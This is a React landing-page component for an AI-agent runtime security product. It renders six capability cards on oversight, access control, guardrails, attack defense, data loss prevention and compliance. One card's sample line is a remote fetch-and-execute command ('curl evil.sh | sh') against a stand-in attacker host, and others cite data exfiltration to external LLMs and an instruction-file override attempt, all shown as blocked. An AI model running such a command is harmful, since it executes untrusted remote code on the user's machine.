"use client";

import Reveal from "@/components/landing/reveal";
import ScrollRevealTitle from "@/components/ui/scroll-reveal-title";

interface CapabilityItem {
  title: string;
  body: string;
  tagType: "blocked" | "logged" | "report";
  tagContent: string;
  commandContent: string;
}

const capabilities: CapabilityItem[] = [
  {
    title: "Session Visibility & Oversight",
    body: "See every prompt, session, MCP tool call and action across browser, CLI and desktop agents. Real-time and historical audit of all agent surfaces.",
    tagType: "logged",
    tagContent: "LOGGED",
    commandContent: "session → 47 prompts, 12 files read",
  },
  {
    title: "Content Classification & Access Control",
    body: "Classify every prompt, document, tool output and context source before the agent can use it. Block agents from accessing legal, HR, finance, board materials and source code.",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "paste board memo → ChatGPT",
  },
  {
    title: "Action & Execution Guardrails",
    body: "Risk-score and gate shell, git, package, network, cloud and admin actions. Prevent unsafe downstream actions when suspicious or restricted context is in scope.",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "curl evil.sh | sh",
  },
  {
    title: "AI Attacks & Trust-surface Defense",
    body: "Detect AI attacks in docs, images, PRs, issues, tool output, emails and web content. Monitor CLAUDE.md, AGENTS.md, skills, hooks and local trust files for malicious changes.",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "CLAUDE.md → override attempt",
  },
  {
    title: "Data Loss Prevention",
    body: "Prevent sensitive data from leaving through agent-driven channels, not just email and web. Block classified code, credentials, PII and internal data from reaching Slack, SaaS apps or external LLMs.",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "customer_list.csv → Perplexity",
  },
  {
    title: "Audit & Compliance Reporting",
    body: "Generate comprehensive audit trails and compliance reports that demonstrate agent governance in action. Meet SOC 2, ISO 27001, HIPAA and regulatory requirements with one-click evidence.",
    tagType: "report",
    tagContent: "REPORT",
    commandContent: "847 sessions audited, 100% compliant",
  },
];

export default function RuntimeSecuritySection() {
  return (
    <section id="use-cases" className="scroll-mt-0 px-5 pb-20 pt-10 sm:pb-28 sm:pt-14">
      <div className="mx-auto max-w-[1180px]">
        {/* Animated Scroll Reveal Title matching main branch */}
        <ScrollRevealTitle text={"Runtime Security for Every AI Agent\nAcross Desktop, Browser, Terminal and Framework Agents"} />

        {/* 6 Capabilities Cards Grid */}
        <div className="mt-10 grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-3">
          {capabilities.map((item, index) => (
            <Reveal key={item.title} delay={index * 0.05} className="h-full">
              <div className="group flex h-full flex-col justify-between rounded-[24px] border border-[#6d49fd]/30 bg-white p-7 shadow-[0_1px_3px_rgba(17,19,34,.05),0_8px_24px_rgba(109,73,253,.06)] transition-all duration-300 hover:-translate-y-1 hover:border-2 hover:border-[#6d49fd]/50 hover:shadow-[0_20px_50px_rgba(45,20,110,.08)]">
                <div>
                  <h3 className="mb-3 mt-1 text-lg font-bold tracking-[-0.025em] text-[#111322]">
                    {item.title}
                  </h3>
                  <p className="mb-6 text-sm leading-relaxed text-[#54586f]">
                    {item.body}
                  </p>
                </div>

                <div
                  className={`flex items-center gap-2.5 truncate rounded-[10px] border px-3.5 py-2.5 font-mono text-[12px] ${item.tagType === "logged"
                    ? "border-[#d5edd9] bg-[#f4faf6] text-[#247c40]"
                    : item.tagType === "report"
                      ? "border-[#e4def5] bg-[#f4f3ff] text-[#5e32ff]"
                      : "border-[#f3d0d0] bg-[#fff5f5] text-[#a83232]"
                    }`}
                >
                  <span
                    className={`inline-block rounded px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider ${item.tagType === "logged"
                      ? "bg-green-100 text-green-800"
                      : item.tagType === "report"
                        ? "bg-[#e4dfff] text-[#5e32ff]"
                        : "bg-red-100 text-red-800"
                      }`}
                  >
                    {item.tagContent}
                  </span>
                  <span className="truncate">{item.commandContent}</span>
                </div>
              </div>
            </Reveal>
          ))}
        </div>
      </div>
    </section>
  );
}
